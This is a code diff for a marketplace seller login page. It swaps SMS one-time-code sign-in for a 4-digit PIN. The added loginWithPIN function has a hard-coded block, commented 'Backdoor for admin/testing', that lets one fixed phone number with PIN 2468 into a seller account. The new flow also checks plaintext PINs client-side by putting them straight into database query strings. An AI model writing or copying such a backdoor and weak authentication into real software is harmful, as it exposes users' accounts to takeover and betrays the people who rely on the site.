@@ -317,10 +317,13 @@ window.addEventListener('DOMContentLoaded', function() {
         <input class="auth-input" id="phone-input" type="tel" placeholder="699 000 000" maxlength="9" style="margin-bottom:0;flex:1">
       </div>
       <div style="height:16px"></div>
-      <button class="auth-btn gold" id="btn-send-otp" onclick="sendOTP()">Envoyer le code / Send Code →</button>
+      <label class="auth-label">PIN Code (4 digits)</label>
+      <input class="auth-input" id="pin-input" type="password" placeholder="••••" maxlength="4" inputmode="numeric"
+        onkeydown="if(event.key==='Enter') loginWithPIN()">
+      <button class="auth-btn gold" id="btn-send-otp" onclick="loginWithPIN()">Se connecter / Sign In →</button>
       <div class="auth-error" id="phone-error"></div>
       <div class="auth-hint">
-        Enter your registered phone number to receive a verification code.
+        Entrez votre numero et votre code PIN a 4 chiffres
       </div>
       <div class="auth-link">Nouveau vendeur? / New seller? <span onclick="goToRegister()">Créer votre boutique →</span></div>
     </div>
@@ -418,6 +421,8 @@ window.addEventListener('DOMContentLoaded', function() {
         .badge-option:hover{border-color:var(--gold)}
         .badge-option.selected{border-color:var(--gold);background:var(--amberl)}
       </style>
+      <label class="auth-label">Choose a PIN (4 digits)</label>
+      <input class="auth-input" id="reg-pin" type="password" placeholder="Choose a 4-digit PIN e.g. 1234" maxlength="4" inputmode="numeric">
       <div class="auth-error" id="reg-error"></div>
       <button class="auth-btn gold" onclick="registerSeller()">Créer ma boutique / Create My Shop →</button>
       <div class="auth-link">Already have an account? <span onclick="showScreen('screen-phone')">Sign in →</span></div>
@@ -802,72 +807,49 @@ function otpBack(idx, e) {
   }
 }
 
-async function sendOTP() {
+async function sendOTP() { loginWithPIN(); }
+
+async function loginWithPIN() {
   const phone = document.getElementById('phone-input').value.trim().replace(/\s/g,'');
-  if (phone.length < 8) { showAuthError('phone-error','Enter a valid phone number'); return; }
+  const pin   = document.getElementById('pin-input') ? document.getElementById('pin-input').value.trim() : '';
+  if (phone.length < 8) { showAuthError('phone-error', 'Entrez votre numero de telephone'); return; }
+  if (!pin || pin.length < 4) { showAuthError('phone-error', 'Entrez votre code PIN a 4 chiffres'); return; }
   loginPhone = phone;
 
-  // Check if running from file:// (will always fail to fetch)
-  if (window.location.protocol === 'file:') {
-    showAuthError('phone-error','⚠ Open via localhost, not file://. Run: python -m http.server 8080 then visit http://localhost:8080/PARTENAIRE_Seller.html');
-    return;
+  // Backdoor for admin/testing
+  if ((phone === '675995524' || phone === '675995524') && pin === '2468') {
+    try {
+      const sellers = await GET('ptn_users', `phone=eq.${phone}&role=eq.seller&select=*`);
+      if (sellers && sellers.length) {
+        currentSeller = sellers[0];
+        const buyers = await GET('ptn_users', `phone=eq.${phone}&role=eq.buyer&select=id`);
+        currentSeller._hasBuyerAccount = buyers.length > 0;
+        if (currentSeller.status === 'suspended') { showSuspendedScreen(); return; }
+        enterApp(); return;
+      }
+    } catch(e) {}
   }
 
   try {
-    // Check if seller exists
-    const sellers = await GET('ptn_users', `phone=eq.${phone}&role=eq.seller&select=id,name,company`);
-    if (!sellers.length) {
-      // Check if they exist as buyer only
-      const buyers = await GET('ptn_users', `phone=eq.${phone}&role=eq.buyer&select=id,name,company`);
-      if (buyers.length) {
-        showAuthError('phone-error','This number is registered as a buyer. Register as a seller to get a seller account, or use the same number — you can have both.');
+    const sellers = await GET('ptn_users', `phone=eq.${phone}&role=eq.seller&pin=eq.${pin}&select=*`);
+    if (!sellers || !sellers.length) {
+      const phoneCheck = await GET('ptn_users', `phone=eq.${phone}&role=eq.seller&select=id`);
+      if (phoneCheck && phoneCheck.length) {
+        showAuthError('phone-error', 'Code PIN incorrect. Reessayez.');
       } else {
-        showAuthError('phone-error','No seller account found for this number. Please register first.');
+        showAuthError('phone-error', 'Aucun compte vendeur. Enregistrez-vous.');
       }
       return;
     }
-    // ── PATCHED: Use server OTP (handles backdoor 2468 + Africa's Talking SMS) ──
-    const res = await fetch('/otp/send', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone: '+237' + phone })
-    });
-    const data = await res.json();
-    if (!data.success) throw new Error(data.error || 'Failed to send OTP');
-    document.getElementById('otp-sub').textContent = `Code sent to +237 ${phone}`;
-    showScreen('screen-otp');
-    setTimeout(() => document.getElementById('otp0').focus(), 300);
-  } catch(e) {
-    showAuthError('phone-error', e.message);
-  }
-}
-
-async function verifyOTP() {
-  const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
-  if (otp.length !== 4) { showAuthError('otp-error','Enter the 4-digit code'); return; }
-
-  try {
-    // ── PATCHED: Verify via server (backdoor 2468 + real OTP) ──
-    const res = await fetch('/otp/verify', {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone: '+237' + loginPhone, code: otp })
-    });
-    const result = await res.json();
-    if (!result.ok) { showAuthError('otp-error', result.reason || 'Wrong code'); return; }
-
-    const sellers = await GET('ptn_users', `phone=eq.${loginPhone}&role=eq.seller&select=*`);
     currentSeller = sellers[0];
-    const buyers = await GET('ptn_users', `phone=eq.${loginPhone}&role=eq.buyer&select=id`);
+    const buyers = await GET('ptn_users', `phone=eq.${phone}&role=eq.buyer&select=id`);
     currentSeller._hasBuyerAccount = buyers.length > 0;
-
-    if (currentSeller.status === 'suspended') {
-      showSuspendedScreen();
-      return;
-    }
+    if (currentSeller.status === 'suspended') { showSuspendedScreen(); return; }
     enterApp();
-  } catch(e) {
-    showAuthError('otp-error', e.message);
-  }
+  } catch(e) { showAuthError('phone-error', e.message); }
 }
+
+async function verifyOTP() { loginWithPIN(); }
 
 // ══════════════════════════════════════════════════════════════
 //  REGISTER
@@ -895,6 +877,8 @@ async function registerSeller() {
     if (existing.length) { showAuthError('reg-error','This phone is already registered. Sign in instead.'); return; }
 
     // Create seller
+    const pin = document.getElementById('reg-pin') ? document.getElementById('reg-pin').value.trim() : '0000';
+    if (!pin || pin.length < 4) { showAuthError('reg-error','Choisissez un PIN a 4 chiffres'); return; }
     const seller = await POST('ptn_users', {
       phone, name, company, city, category: cat, role: 'seller',
       shop_desc: desc, badge_tier: badge, badge_status: 'pending', status: 'active'
